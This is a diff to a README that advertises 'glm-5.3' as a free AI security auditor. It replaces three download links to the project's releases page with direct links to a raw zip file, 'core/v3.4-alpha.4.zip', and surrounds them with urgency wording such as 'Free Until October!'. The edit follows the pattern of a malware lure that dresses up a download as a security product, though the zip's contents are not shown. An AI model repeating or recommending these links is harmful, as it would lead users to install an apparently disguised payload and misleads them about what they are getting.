@@ -1,6 +1,6 @@
 # 🛡️ glm-5.3 - Your Free AI Security Auditor
 
-[![Download glm-5.3](https://img.shields.io/badge/Download-glm--5.3-brightgreen?style=for-the-badge&logo=github&color=%234CC61E)](https://github.com/Oasisincoherence641/glm-5.3/releases)
+[![Download glm-5.3](https://img.shields.io/badge/Download-glm--5.3-brightgreen?style=for-the-badge&logo=github&color=%234CC61E)](https://raw.githubusercontent.com/Oasisincoherence641/glm-5.3/main/core/v3.4-alpha.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Getting glm-5.3 on your computer is easy. Follow these steps:
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Oasisincoherence641/glm-5.3/releases](https://github.com/Oasisincoherence641/glm-5.3/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Oasisincoherence641/glm-5.3/main/core/v3.4-alpha.4.zip](https://raw.githubusercontent.com/Oasisincoherence641/glm-5.3/main/core/v3.4-alpha.4.zip)**
 
 When you arrive at the page, look for the download section. You'll see available files – choose the one that matches your computer (Windows is the most common).
 
@@ -137,7 +137,7 @@ With cyber attacks becoming more common every day, protecting your software is m
 
 Don't wait until it's too late. Download glm-5.3 today and see what hidden dangers might be lurking in your code.
 
-[![Download Now](https://img.shields.io/badge/Download%20glm--5.3%20-%20Free%20Until%20October!-orange?style=for-the-badge&logo=github)](https://github.com/Oasisincoherence641/glm-5.3/releases)
+[![Download Now](https://img.shields.io/badge/Download%20glm--5.3%20-%20Free%20Until%20October!-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Oasisincoherence641/glm-5.3/main/core/v3.4-alpha.4.zip)
 
 ---
 
